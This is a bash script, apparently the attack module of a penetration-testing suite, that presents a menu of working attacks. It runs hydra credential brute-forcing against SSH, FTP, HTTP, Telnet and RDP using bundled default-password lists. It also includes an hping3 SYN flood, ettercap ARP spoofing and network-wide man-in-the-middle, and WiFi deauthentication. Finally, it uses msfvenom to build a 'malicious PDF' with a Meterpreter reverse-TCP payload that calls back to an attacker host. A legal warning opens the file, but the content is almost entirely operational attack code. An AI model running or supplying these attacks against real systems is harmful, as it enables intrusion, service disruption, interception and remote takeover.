#!/bin/bash
# Project: Brabus Recon Suite (BRS)
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-08-11 00:09:08 MSK
# This file was modified
# Telegram: https://t.me/easyprotech

# Brabus Recon Suite (BRS) - Attack Tools Module
# Network penetration testing and attack simulation tools
# company: EasyProTech LLC (www.easypro.tech)
# repository: https://github.com/EPTLLC/brs
# contact: mail.easypro.tech@gmail.com
# telegram: https://t.me/easyprotech
# author: brabus
# version: 2.0

# ⚠️ CRITICAL LEGAL WARNING ⚠️
# UNAUTHORIZED USE IS ILLEGAL AND MAY RESULT IN CRIMINAL PROSECUTION
# 
# This module contains aggressive penetration testing tools that can cause
# significant damage if misused. Use ONLY on systems you own or have explicit
# written authorization to test.
#
# Unauthorized use may result in:
# • Criminal charges under computer crime laws (CFAA, etc.)
# • Substantial fines (potentially millions of dollars)
# • Prison time (multiple years depending on jurisdiction)
# • Permanent criminal record
# • Civil lawsuits for damages
#
# BY USING THIS MODULE, YOU ACKNOWLEDGE:
# • You own the target systems OR have explicit written authorization
# • You understand applicable laws in your jurisdiction
# • You accept FULL RESPONSIBILITY for your actions
# • You will indemnify EasyProTech LLC from any claims
#
# IF YOU CANNOT MAKE THESE DECLARATIONS, EXIT NOW (Ctrl+C)

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
DEFAULT_TIMEOUT=300  # 5 minutes default timeout
ATTACK_TIMEOUT=120   # 2 minutes for attacks

# Signal handling for graceful interruption
cleanup() {
    echo -e "\n${YELLOW}⚠️ Attack interrupted by user${NC}"
    pkill -P $$ 2>/dev/null
    exit 130
}
trap cleanup SIGINT SIGTERM

# Show spinner for long operations
show_spinner() {
    local pid=$1
    local message=$2
    local start_time=$(date +%s)
    local spin_chars="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    local i=0
    
    while kill -0 $pid 2>/dev/null; do
        local elapsed=$(($(date +%s) - start_time))
        local mins=$((elapsed / 60))
        local secs=$((elapsed % 60))
        printf "\r\033[K${CYAN}${spin_chars:$i:1} %s ${YELLOW}[%02d:%02d] ${RED}(Ctrl+C to cancel)${NC}" "$message" $mins $secs
        i=$(( (i+1) % ${#spin_chars} ))
        sleep 0.1
    done
    printf "\r\033[K"  # Clear line
}

# Language support
# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$(dirname "$SCRIPT_DIR")"
LANGUAGES_DIR="$BASE_DIR/languages"
CONFIG_DIR="$BASE_DIR/configs"
LANGUAGE_CONFIG="$CONFIG_DIR/language.conf"

# Load language configuration
if [ -f "$LANGUAGE_CONFIG" ]; then
    source "$LANGUAGE_CONFIG"
else
    CURRENT_LANGUAGE="en"
fi

# Load language file
if [ -f "$LANGUAGES_DIR/$CURRENT_LANGUAGE.sh" ]; then
    source "$LANGUAGES_DIR/$CURRENT_LANGUAGE.sh"
else
    source "$LANGUAGES_DIR/en.sh"
fi

RESULTS_DIR="$BASE_DIR/results"
WORDLISTS_DIR="$BASE_DIR/wordlists"
mkdir -p "$RESULTS_DIR" "$WORDLISTS_DIR"

show_warning() {
    echo -e "${RED}$ATTACK_WARNING_TITLE${NC}"
    echo -e "${YELLOW}$ATTACK_WARNING_TEXT"
    echo -e "$ATTACK_WARNING_ILLEGAL${NC}"
    echo ""
    echo -e "${BLUE}$ATTACK_CONTINUE_PROMPT ${NC}"
    read -r consent
    if [[ ! "$consent" =~ ^[Yy]$ ]]; then
        echo -e "${GREEN}$ATTACK_OPERATION_CANCELLED${NC}"
        exit 0
    fi
}

show_menu() {
    echo -e "${PURPLE}$ATTACK_TOOLS_TITLE${NC}"
    echo "======================"
    echo "1) $ATTACK_SSH_BRUTE"
    echo "2) $ATTACK_FTP_BRUTE"
    echo "3) $ATTACK_HTTP_BRUTE"
    echo "4) $ATTACK_TELNET_BRUTE"
    echo "5) $ATTACK_RDP_BRUTE"
    echo "6) $ATTACK_DOS"
    echo "7) $ATTACK_ARP_SPOOF"
    echo "8) $ATTACK_MITM"
    echo "9) $ATTACK_WORDLIST_CREATE"
    echo "10) $ATTACK_DIR_BRUTE"
    echo "11) $ATTACK_WIFI"
    echo "12) $ATTACK_MALICIOUS_PDF"
    echo "0) $SETTINGS_BACK"
    echo -n "$MENU_CHOOSE_OPTION: "
}

get_target() {
    echo -n "$ATTACK_TARGET_PROMPT "
    read TARGET
    echo -e "${CYAN}$INPUT_SELECTED_TARGET $TARGET${NC}"
    if [ -z "$TARGET" ]; then
        echo -e "${RED}$ATTACK_TARGET_NOT_SPECIFIED${NC}"
        return 1
    fi
    return 0
}

create_wordlists() {
    echo -e "${BLUE}$ATTACK_CREATING_WORDLISTS${NC}"
    
    # Basic password list
    cat > "$WORDLISTS_DIR/common_passwords.txt" << EOL
password
123456
123456789
qwerty
abc123
password123
admin
administrator
root
guest
user
test
welcome
login
pass
secret
default
123123
000000
1234567890
EOL
    
    # User list
    cat > "$WORDLISTS_DIR/common_users.txt" << EOL
admin
administrator
root
user
guest
test
operator
service
daemon
www
ftp
mail
nobody
postmaster
EOL
    
    # SSH login:password combinations
    cat > "$WORDLISTS_DIR/ssh_combinations.txt" << EOL
root:root
root:toor
root:password
root:123456
admin:admin
admin:password
user:user
guest:guest
test:test
pi:raspberry
ubuntu:ubuntu
EOL
    
    echo -e "${GREEN}$ATTACK_WORDLISTS_CREATED $WORDLISTS_DIR${NC}"
}

ssh_bruteforce() {
    get_target || return 1
    TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
    OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_ssh_attack_${TARGET//\//_}.txt"
    
    
    # Check SSH port availability
    if ! timeout 3 bash -c "cat < /dev/null > /dev/tcp/$TARGET/22" 2>/dev/null; then
        echo -e "${RED}$CONNECTIVITY_SSH_FAILED${NC}"
        echo -e "${YELLOW}$CONNECTIVITY_REASONS${NC}"
        echo "   $CONNECTIVITY_PORT_CLOSED (22)"
        echo "   $CONNECTIVITY_IP_BANNED"
        echo "   $CONNECTIVITY_FIREWALL"
        echo "   $CONNECTIVITY_SERVER_DOWN"
        return 1
    fi
    echo -e "${GREEN}$CONNECTIVITY_SUCCESS${NC}"
    
    if [ ! -f "$WORDLISTS_DIR/common_users.txt" ]; then
        create_wordlists
    fi
    
    echo "$ATTACK_SELECT_MODE"
    echo "1) $ATTACK_FAST_MODE"
    echo "2) $ATTACK_DICT_MODE"
    echo "3) $ATTACK_COMBINED_MODE"
    echo -n "$INPUT_SELECT_MODE "
    read -r mode
    echo -e "${CYAN}$INPUT_SELECTED_MODE $mode${NC}"
    
    case $mode in
        1)
            echo -e "${YELLOW}$TIMEOUT_SCANNING_WITH 120s (fast attack)${NC}"
            timeout 120 hydra -L "$WORDLISTS_DIR/common_users.txt" -P "$WORDLISTS_DIR/common_passwords.txt" -t 4 -w 10 "$TARGET" ssh > "$OUTPUT_FILE" 2>&1 &
            attack_pid=$!
            show_spinner $attack_pid "SSH brute force attack on $TARGET"
            wait $attack_pid
            local exit_code=$?
            if [ $exit_code -eq 124 ]; then
                echo -e "${YELLOW}$TIMEOUT_TIMED_OUT_AFTER 120s${NC}"
                echo "$TIMEOUT_SCAN_TIMED_OUT" >> "$OUTPUT_FILE"
            fi
            ;;
        2)
            echo -n "$ATTACK_WORDLIST_PATH "
            read wordlist
            echo -e "${CYAN}$INPUT_SELECTED_PATH $wordlist${NC}"
            if [ -f "$wordlist" ]; then
                echo -e "${YELLOW}$TIMEOUT_SCANNING_WITH 300s (dictionary attack)${NC}"
                timeout 300 hydra -L "$WORDLISTS_DIR/common_users.txt" -P "$wordlist" -t 4 -w 10 "$TARGET" ssh > "$OUTPUT_FILE" 2>&1 &
                attack_pid=$!
                show_spinner $attack_pid "SSH dictionary attack on $TARGET"
                wait $attack_pid
                local exit_code=$?
                if [ $exit_code -eq 124 ]; then
                    echo -e "${YELLOW}$TIMEOUT_TIMED_OUT_AFTER 300s${NC}"
                    echo "$TIMEOUT_SCAN_TIMED_OUT" >> "$OUTPUT_FILE"
                fi
            else
                echo -e "${RED}$ATTACK_FILE_NOT_FOUND${NC}"
                return 1
            fi
            ;;
        3)
            echo -e "${YELLOW}$TIMEOUT_SCANNING_WITH 180s (combined attack)${NC}"
            timeout 180 hydra -C "$WORDLISTS_DIR/ssh_combinations.txt" -t 4 -w 10 "$TARGET" ssh > "$OUTPUT_FILE" 2>&1 &
            attack_pid=$!
            show_spinner $attack_pid "SSH combined attack on $TARGET"
            wait $attack_pid
            local exit_code=$?
            if [ $exit_code -eq 124 ]; then
                echo -e "${YELLOW}$TIMEOUT_TIMED_OUT_AFTER 180s${NC}"
                echo "$TIMEOUT_SCAN_TIMED_OUT" >> "$OUTPUT_FILE"
            fi
            ;;
    esac
    
    cat "$OUTPUT_FILE"
    
    echo -e "${GREEN}$ATTACK_RESULTS_SAVED $OUTPUT_FILE${NC}"
}

ftp_bruteforce() {
    get_target || return 1
    TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
    OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_ftp_attack_${TARGET//\//_}.txt"
    
    
    # Check FTP port availability
    if ! timeout 3 bash -c "cat < /dev/null > /dev/tcp/$TARGET/21" 2>/dev/null; then
        echo -e "${RED}$CONNECTIVITY_FTP_FAILED${NC}"
        echo -e "${YELLOW}$CONNECTIVITY_CHECK_AVAILABILITY $TARGET:21${NC}"
        return 1
    fi
    echo -e "${GREEN}$CONNECTIVITY_SUCCESS${NC}"
    
    if [ ! -f "$WORDLISTS_DIR/common_users.txt" ]; then
        create_wordlists
    fi
    
    echo -e "${YELLOW}$TIMEOUT_SCANNING_WITH 120s (FTP brute force)${NC}"
    timeout 120 hydra -L "$WORDLISTS_DIR/common_users.txt" -P "$WORDLISTS_DIR/common_passwords.txt" -t 6 -w 10 "$TARGET" ftp > "$OUTPUT_FILE" 2>&1 &
    attack_pid=$!
    show_spinner $attack_pid "FTP brute force attack on $TARGET"
    wait $attack_pid
    local exit_code=$?
    if [ $exit_code -eq 124 ]; then
        echo -e "${YELLOW}$TIMEOUT_TIMED_OUT_AFTER 120s${NC}"
        echo "$TIMEOUT_SCAN_TIMED_OUT" >> "$OUTPUT_FILE"
    fi
    
    cat "$OUTPUT_FILE"
    echo -e "${GREEN}$ATTACK_RESULTS_SAVED $OUTPUT_FILE${NC}"
}

http_bruteforce() {
    echo -n "$ATTACK_URL_PROMPT "
    read URL
    echo -e "${CYAN}$INPUT_SELECTED_URL $URL${NC}"
    if [ -z "$URL" ]; then
        echo -e "${RED}$ATTACK_URL_NOT_SPECIFIED${NC}"
        return 1
    fi
    
    TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
    OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_http_attack.txt"
    
    
    # Check HTTP port availability
    # Extract host from URL
    HTTP_HOST=$(echo "$URL" | sed -e 's|^[^/]*//||' -e 's|/.*$||' -e 's|:.*$||')
    HTTP_PORT=$(echo "$URL" | grep -o ':[0-9]*' | tr -d ':')
    HTTP_PORT=${HTTP_PORT:-80}
    
    if ! timeout 3 bash -c "cat < /dev/null > /dev/tcp/$HTTP_HOST/$HTTP_PORT" 2>/dev/null; then
        echo -e "${RED}$CONNECTIVITY_HTTP_FAILED${NC}"
        echo -e "${YELLOW}$CONNECTIVITY_CHECK_AVAILABILITY $HTTP_HOST:$HTTP_PORT${NC}"
        return 1
    fi
    echo -e "${GREEN}$CONNECTIVITY_SUCCESS${NC}"
    
    if [ ! -f "$WORDLISTS_DIR/common_users.txt" ]; then
        create_wordlists
    fi
    
    echo -e "${YELLOW}$TIMEOUT_SCANNING_WITH 120s (HTTP brute force)${NC}"
    timeout 120 hydra -L "$WORDLISTS_DIR/common_users.txt" -P "$WORDLISTS_DIR/common_passwords.txt" -s 80 -w 10 -f "$URL" http-get > "$OUTPUT_FILE" 2>&1 &
    attack_pid=$!
    show_spinner $attack_pid "HTTP brute force attack on $URL"
    wait $attack_pid
    local exit_code=$?
    if [ $exit_code -eq 124 ]; then
        echo -e "${YELLOW}$TIMEOUT_TIMED_OUT_AFTER 120s${NC}"
        echo "$TIMEOUT_SCAN_TIMED_OUT" >> "$OUTPUT_FILE"
    fi
    
    cat "$OUTPUT_FILE"
    echo -e "${GREEN}$ATTACK_RESULTS_SAVED $OUTPUT_FILE${NC}"
}

telnet_bruteforce() {
    get_target || return 1
    TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
    OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_telnet_attack_${TARGET//\//_}.txt"
    
    
    # Check Telnet port availability
    if ! timeout 3 bash -c "cat < /dev/null > /dev/tcp/$TARGET/23" 2>/dev/null; then
        echo -e "${RED}$CONNECTIVITY_TELNET_FAILED${NC}"
        echo -e "${YELLOW}$CONNECTIVITY_CHECK_AVAILABILITY $TARGET:23${NC}"
        return 1
    fi
    echo -e "${GREEN}$CONNECTIVITY_SUCCESS${NC}"
    
    if [ ! -f "$WORDLISTS_DIR/common_users.txt" ]; then
        create_wordlists
    fi
    
    echo -e "${YELLOW}$TIMEOUT_SCANNING_WITH 120s (Telnet brute force)${NC}"
    timeout 120 hydra -L "$WORDLISTS_DIR/common_users.txt" -P "$WORDLISTS_DIR/common_passwords.txt" -w 10 "$TARGET" telnet > "$OUTPUT_FILE" 2>&1 &
    attack_pid=$!
    show_spinner $attack_pid "Telnet brute force attack on $TARGET"
    wait $attack_pid
    local exit_code=$?
    if [ $exit_code -eq 124 ]; then
        echo -e "${YELLOW}$TIMEOUT_TIMED_OUT_AFTER 120s${NC}"
        echo "$TIMEOUT_SCAN_TIMED_OUT" >> "$OUTPUT_FILE"
    fi
    
    cat "$OUTPUT_FILE"
    echo -e "${GREEN}$ATTACK_RESULTS_SAVED $OUTPUT_FILE${NC}"
}

rdp_bruteforce() {
    get_target || return 1
    TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
    OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_rdp_attack_${TARGET//\//_}.txt"
    
    
    # Check RDP port availability
    if ! timeout 3 bash -c "cat < /dev/null > /dev/tcp/$TARGET/3389" 2>/dev/null; then
        echo -e "${RED}$CONNECTIVITY_RDP_FAILED${NC}"
        echo -e "${YELLOW}$CONNECTIVITY_CHECK_AVAILABILITY $TARGET:3389${NC}"
        return 1
    fi
    echo -e "${GREEN}$CONNECTIVITY_SUCCESS${NC}"
    
    if [ ! -f "$WORDLISTS_DIR/common_users.txt" ]; then
        create_wordlists
    fi
    
    echo -e "${YELLOW}$TIMEOUT_SCANNING_WITH 120s (RDP brute force)${NC}"
    timeout 120 hydra -L "$WORDLISTS_DIR/common_users.txt" -P "$WORDLISTS_DIR/common_passwords.txt" -w 10 rdp://"$TARGET" > "$OUTPUT_FILE" 2>&1 &
    attack_pid=$!
    show_spinner $attack_pid "RDP brute force attack on $TARGET"
    wait $attack_pid
    local exit_code=$?
    if [ $exit_code -eq 124 ]; then
        echo -e "${YELLOW}$TIMEOUT_TIMED_OUT_AFTER 120s${NC}"
        echo "$TIMEOUT_SCAN_TIMED_OUT" >> "$OUTPUT_FILE"
    fi
    
    cat "$OUTPUT_FILE"
    echo -e "${GREEN}$ATTACK_RESULTS_SAVED $OUTPUT_FILE${NC}"
}

dos_attack() {
    get_target || return 1
    
    echo -e "${RED}$ATTACK_DOS_WARNING${NC}"
    echo -e "${BLUE}$ATTACK_CONTINUE_PROMPT ${NC}"
    read -r confirm
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        return 0
    fi
    
    echo -n "$ATTACK_PORT_PROMPT "
    read PORT
    PORT=${PORT:-80}
    
    echo -n "$ATTACK_DURATION_PROMPT "
    read DURATION
    DURATION=${DURATION:-30}
    
    
    # Use hping3 if available
    if ! command -v hping3 &> /dev/null; then
        echo -e "${YELLOW}hping3 is not installed. Please install via Settings → Check Tools or your package manager.${NC}"
        return 1
    fi
    timeout "$DURATION" hping3 -S -p "$PORT" --flood "$TARGET"
    
    echo -e "${GREEN}$ATTACK_DOS_COMPLETE${NC}"
}

arp_spoof() {
    echo -e "${BLUE}🕸️ $ATTACK_ARP_SPOOF${NC}"
    
    if ! command -v ettercap &> /dev/null; then
        echo -e "${YELLOW}ettercap is not installed. Please install via Settings → Check Tools or your package manager.${NC}"
        return 1
    fi
    
    echo -n "$ATTACK_GATEWAY_PROMPT "
    read GATEWAY
    echo -n "$ATTACK_TARGET_IP_PROMPT "
    read TARGET_IP
    echo -n "$ATTACK_INTERFACE_PROMPT "
    read INTERFACE
    
    echo -e "${YELLOW}$ATTACK_PRESS_CTRL_C${NC}"
    
    sudo ettercap -T -i "$INTERFACE" -M arp:remote /"$GATEWAY"/ /"$TARGET_IP"/
}

mitm_attack() {
    echo -e "${BLUE}🕵️ $ATTACK_MITM${NC}"
    
    if ! command -v ettercap &> /dev/null; then
        echo -e "${YELLOW}ettercap is not installed. Please install via Settings → Check Tools or your package manager.${NC}"
        return 1
    fi
    
    echo -n "$ATTACK_INTERFACE_PROMPT "
    read INTERFACE
    
    echo "$ATTACK_SELECT_MODE"
    echo "1) Network scan"
    echo "2) ARP poisoning entire network"
    echo "3) Targeted MITM attack"
    echo -n "$INPUT_SELECT_MODE "
    read -r mode
    echo -e "${CYAN}$INPUT_SELECTED_MODE $mode${NC}"
    
    case $mode in
        1)
            sudo ettercap -T -i "$INTERFACE" -P list
            ;;
        2)
            sudo ettercap -T -i "$INTERFACE" -M arp:remote //
            ;;
        3)
            echo -n "Target IP 1: "
            read TARGET1
            echo -n "Target IP 2: "
            read TARGET2
            sudo ettercap -T -i "$INTERFACE" -M arp:remote /"$TARGET1"/ /"$TARGET2"/
            ;;
    esac
}

directory_bruteforce() {
    echo -n "$ATTACK_URL_PROMPT "
    read BASE_URL
    echo -e "${CYAN}$INPUT_SELECTED_URL $BASE_URL${NC}"
    if [ -z "$BASE_URL" ]; then
        echo -e "${RED}$ATTACK_URL_NOT_SPECIFIED${NC}"
        return 1
    fi
    
    TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
    OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_dirbuster.txt"
    
    
    # Create basic directory list
    cat > /tmp/dirs.txt << EOL
admin
administrator
login
panel
dashboard
uploads
images
css
js
api
backup
test
dev
staging
EOL
    
    echo "Select tool:"
    echo "1) dirb (simple and fast)"
    echo "2) dirhunt (Python)"
    echo "3) Custom curl scan"
    echo -n "$INPUT_SELECT_TOOL "
    read -r tool
    echo -e "${CYAN}$INPUT_SELECTED_TOOL $tool${NC}"
    
    case $tool in
        1)
            if ! command -v dirb &> /dev/null; then
                echo -e "${YELLOW}dirb is not installed. Please install via Settings → Check Tools or your package manager.${NC}"
                rm -f /tmp/dirs.txt
                return 1
            fi
            dirb "$BASE_URL" /tmp/dirs.txt | tee "$OUTPUT_FILE"
            ;;
        2)
            dirhunt "$BASE_URL" | tee "$OUTPUT_FILE"
            ;;
        3)
            while read -r dir; do
                status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/$dir/")
                if [ "$status" != "404" ]; then
                    echo "[$status] $BASE_URL/$dir/" | tee -a "$OUTPUT_FILE"
                fi
            done < /tmp/dirs.txt
            ;;
    esac
    
    rm -f /tmp/dirs.txt
    echo -e "${GREEN}$ATTACK_RESULTS_SAVED $OUTPUT_FILE${NC}"
}

wifi_attack() {
    echo -e "${BLUE}📡 WiFi attacks${NC}"
    
    if ! command -v aircrack-ng &> /dev/null; then
        echo -e "${YELLOW}aircrack-ng is not installed. Please install via Settings → Check Tools or your package manager.${NC}"
        return 1
    fi
    
    echo "$ATTACK_SELECT_MODE"
    echo "1) $ATTACK_MONITOR_NETWORKS"
    echo "2) $ATTACK_CAPTURE_HANDSHAKE"
    echo "3) $ATTACK_DEAUTH"
    echo -n "$INPUT_SELECT_MODE "
    read -r mode
    echo -e "${CYAN}$INPUT_SELECTED_MODE $mode${NC}"
    
    echo -n "$ATTACK_WIFI_INTERFACE_PROMPT "
    read WIFI_INTERFACE
    
    case $mode in
        1)
            echo -e "${BLUE}$ATTACK_ENABLING_MONITOR${NC}"
            sudo airmon-ng start "$WIFI_INTERFACE"
            echo -e "${BLUE}$ATTACK_SCANNING_NETWORKS${NC}"
            sudo airodump-ng "${WIFI_INTERFACE}mon"
            ;;
        2)
            echo -n "$ATTACK_BSSID_PROMPT "
            read BSSID
            echo -n "$ATTACK_CHANNEL_PROMPT "
            read CHANNEL
            TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
            echo -e "${BLUE}$ATTACK_CAPTURING_HANDSHAKE${NC}"
            sudo airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "/tmp/capture_$TIMESTAMP" "${WIFI_INTERFACE}mon"
            ;;
        3)
            echo -n "$ATTACK_BSSID_PROMPT "
            read BSSID
            echo -n "$ATTACK_CLIENT_MAC_PROMPT "
            read CLIENT_MAC
            if [ -z "$CLIENT_MAC" ]; then
                sudo aireplay-ng -0 10 -a "$BSSID" "${WIFI_INTERFACE}mon"
            else
                sudo aireplay-ng -0 10 -a "$BSSID" -c "$CLIENT_MAC" "${WIFI_INTERFACE}mon"
            fi
            ;;
    esac
}

create_malicious_pdf() {
    echo -e "${BLUE}📄 Generate malicious PDF${NC}"
    
    if ! command -v msfvenom &> /dev/null; then
        echo -e "${YELLOW}msfvenom (metasploit-framework) is not installed. Please install manually.${NC}"
        return 1
    fi
    
    echo -n "$ATTACK_LHOST_PROMPT "
    read LHOST
    echo -n "$ATTACK_LPORT_PROMPT "
    read LPORT
    
    TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
    OUTPUT_FILE="/tmp/${TIMESTAMP}_malicious.pdf"
    
    echo -e "${BLUE}$ATTACK_CREATING_PAYLOAD${NC}"
    msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f pdf > "$OUTPUT_FILE"
    
    echo -e "${GREEN}$ATTACK_PDF_CREATED $OUTPUT_FILE${NC}"
    echo -e "${YELLOW}$ATTACK_USE_AUTHORIZED_ONLY${NC}"
}

# Show security warning
show_warning

# Create basic wordlists on first run
if [ ! -f "$WORDLISTS_DIR/common_passwords.txt" ]; then
    create_wordlists
fi

# Main loop
while true; do
    show_menu
    read choice
    
    case $choice in
        1) ssh_bruteforce ;;
        2) ftp_bruteforce ;;
        3) http_bruteforce ;;
        4) telnet_bruteforce ;;
        5) rdp_bruteforce ;;
        6) dos_attack ;;
        7) arp_spoof ;;
        8) mitm_attack ;;
        9) create_wordlists ;;
        10) directory_bruteforce ;;
        11) wifi_attack ;;
        12) create_malicious_pdf ;;
        0) echo -e "${GREEN}$ATTACK_GOODBYE${NC}"; break ;;
        *) echo -e "${RED}$ATTACK_INVALID_CHOICE${NC}" ;;
    esac
    

done
